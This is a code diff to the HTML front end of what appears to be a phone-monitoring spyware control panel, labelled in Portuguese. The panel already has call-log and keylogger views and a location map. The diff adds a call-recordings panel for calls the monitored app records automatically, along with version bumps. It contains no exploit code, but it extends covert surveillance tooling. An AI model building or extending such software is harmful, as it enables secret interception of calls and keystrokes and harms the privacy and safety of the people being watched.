@@ -15,7 +15,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <link rel="stylesheet" href="style.css?v=36">
+    <link rel="stylesheet" href="style.css?v=37">
     <style>
 /* ── Histórico de Passagens ──────────────────────────────────────────── */
 .historico-card{display:flex;flex-direction:column;overflow:hidden}
@@ -248,6 +248,10 @@
                     <button class="snav-item" data-nav="calllogs" onclick="sidebarNav('calllogs')">
                         <i class="fa-solid fa-phone-volume"></i>
                         <span>Ligações</span>
+                    </button>
+                    <button class="snav-item" data-nav="call-recordings" onclick="sidebarNav('call-recordings')">
+                        <i class="fa-solid fa-phone-arrow-down-left"></i>
+                        <span>Grav. de Ligações</span>
                     </button>
                     <button class="snav-item" data-nav="keylog" onclick="sidebarNav('keylog')">
                         <i class="fa-solid fa-keyboard"></i>
@@ -751,6 +755,21 @@
                     </div>
                 </div>
 
+                <!-- Call Recordings Panel -->
+                <div class="grid-card call-recordings-card" data-tab="call-recordings">
+                    <div class="card-header">
+                        <h3><i class="fa-solid fa-phone-arrow-down-left neon-text-green"></i> Gravações de Ligações</h3>
+                        <button class="btn btn-sm btn-primary" onclick="fetchMediaList(currentDeviceId)"><i class="fa-solid fa-rotate-right"></i> Atualizar</button>
+                    </div>
+                    <div class="card-body audio-card-body">
+                        <div id="call-recordings-empty" class="contacts-empty">
+                            <i class="fa-solid fa-phone-slash fa-2x"></i>
+                            <p>Nenhuma gravação de ligação ainda.<br><small>O app grava automaticamente quando uma ligação é detectada.</small></p>
+                        </div>
+                        <div class="audio-list" id="call-recordings-list" style="display:none"></div>
+                    </div>
+                </div>
+
                 <!-- Keylog Panel -->
                 <div class="grid-card keylog-card" data-tab="keylog">
                     <div class="card-header">
@@ -933,7 +952,7 @@
         </div>
     </div>
 
-    <script src="app.js?v=41"></script>
+    <script src="app.js?v=42"></script>
     <script>
 // ── Histórico de Passagens ───────────────────────────────────────────────────────────
 (function(){
